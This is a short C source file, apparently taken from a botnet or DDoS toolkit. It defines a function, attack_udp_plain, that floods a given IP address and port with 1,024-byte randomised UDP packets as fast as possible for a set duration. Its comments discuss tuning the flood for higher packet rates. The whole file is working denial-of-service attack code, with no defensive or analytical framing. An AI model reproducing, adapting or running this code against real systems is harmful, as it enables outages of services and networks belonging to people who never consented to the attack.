#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>
#include <fcntl.h>

#include "attack.h"

// high pps udp flood
void attack_udp_plain(uint32_t ip, uint16_t port, uint32_t duration) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = ip;

    // connect() skips routing lookups
    if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) == -1) {
        close(sock);
        return;
    }

    char packet[1024];
    
    for (int i = 0; i < 1024; i += 4) {
        *(uint32_t *)&packet[i] = fast_rand();
    }

    time_t end_time = time(NULL) + duration;
    
    // Non-blocking socket might help avoid stuck buffers, but for flooding blocking is usually fine 
    // until buffer fills, then it blocks (throttle).
    
    while (time(NULL) < end_time) {
        // Optimization: Don't re-randomize WHOLE packet every time.
        // Just randomization first few bytes is enough to change hash.
        *(uint32_t *)packet = fast_rand();
        *(uint32_t *)&packet[4] = fast_rand();

        // Send with MSG_DONTWAIT to avoid context switch if buffer full?
        // No, we want to push as hard as possible.
        send(sock, packet, sizeof(packet), 0);
    }

    close(sock);
}
